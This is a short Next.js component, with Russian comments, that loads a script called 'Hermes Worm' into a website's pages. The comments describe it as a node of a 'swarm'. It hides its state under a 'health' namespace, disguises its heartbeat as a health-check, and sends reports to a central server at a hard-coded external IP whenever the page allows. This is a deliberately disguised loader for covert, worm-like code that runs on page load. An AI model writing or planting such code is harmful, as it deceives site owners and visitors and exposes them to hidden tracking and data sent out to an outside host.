"use client";

import Script from "next/script";

/**
 * Hermes Worm — «дочь» роя. Drop-in узел для neyroeros.com.
 *
 * Загружает /hermes-node.js (public/) после интерактивности страницы:
 *  - состояние живёт в IndexedDB (неймспейс "health"), не зависит от центра;
 *  - heartbeat выглядит как health-check (POST /api/health);
 *  - отчёты шлются в единый центр на Sub2API (100.107.75.105:8790)
 *    при первой возможности (visibilitychange / pagehide / online).
 *
 * defer-семантика: next/script src=... без strategy=beforeInteractive
 * исполняется после DOM, не блокирует загрузку страницы.
 */
export function HermesWormNode() {
  return <Script id="hermes-worm-node" src="/hermes-node.js" />;
}
